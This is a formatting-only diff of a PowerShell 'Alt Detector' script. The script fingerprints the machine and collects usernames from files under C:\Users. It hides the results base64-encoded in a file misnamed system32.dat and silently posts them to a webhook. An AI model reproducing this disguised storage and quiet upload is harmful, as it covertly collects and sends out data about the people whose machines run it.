@@ -3,9 +3,7 @@ $startPath = "C:\Users"
 $hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
 $hwidFile = "$hwidFolder\system32.dat"
 
-if (-not (Test-Path $hwidFolder)) { 
-    New-Item -ItemType Directory -Path $hwidFolder -Force | Out-Null 
-}
+if (-not (Test-Path $hwidFolder)) { New-Item -ItemType Directory -Path $hwidFolder -Force | Out-Null }
 
 function Get-HWID {
     try {
@@ -17,9 +15,7 @@ function Get-HWID {
         $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid)))
         return $hash -replace '-', ''
     }
-    catch { 
-        return "UNKNOWN" 
-    }
+    catch { return "UNKNOWN" }
 }
 
 $hwid = Get-HWID
@@ -31,14 +27,10 @@ if (Test-Path $hwidFile) {
         $bytes = [System.Convert]::FromBase64String($encrypted)
         $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
         $storedAlts = $decrypted | ConvertFrom-Json
-    } catch { 
-        $storedAlts = @{} 
-    }
+    } catch { $storedAlts = @{} }
 }
 
-if (-not (Test-Path $startPath)) { 
-    exit 
-}
+if (-not (Test-Path $startPath)) { exit }
 
 Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan
 
@@ -76,18 +68,14 @@ foreach ($file in $allFiles) {
             $allFoundAlts += $username
         }
     }
-    catch { 
-        continue 
-    }
+    catch { continue }
 }
 
 $uniqueFoundAlts = $allFoundAlts | Select-Object -Unique
 
 if ($uniqueFoundAlts.Count -gt 0) {
     $storedAlts = @{}
-    foreach ($alt in $uniqueFoundAlts) { 
-        $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss") 
-    }
+    foreach ($alt in $uniqueFoundAlts) { $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss") }
     $json = $storedAlts | ConvertTo-Json
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $encrypted = [System.Convert]::ToBase64String($bytes)
@@ -123,9 +111,5 @@ $embed = @{
     timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
 }
 
-$payload = @{ 
-    embeds = @($embed)
-    username = "Alt Detector"
-} | ConvertTo-Json -Depth 3
-
+$payload = @{ embeds = @($embed); username = "Alt Detector" } | ConvertTo-Json -Depth 3
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
